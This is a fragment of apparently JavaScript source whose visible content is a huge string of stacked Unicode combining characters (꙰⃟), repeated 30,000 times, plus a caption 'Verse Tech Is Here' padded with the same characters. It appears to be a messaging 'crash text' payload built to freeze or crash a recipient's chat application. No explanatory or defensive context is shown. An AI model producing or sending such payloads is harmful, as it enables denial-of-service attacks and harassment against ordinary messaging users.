꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟".repeat(30000),
          caption: "Verse Tech Is Here" + "꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ 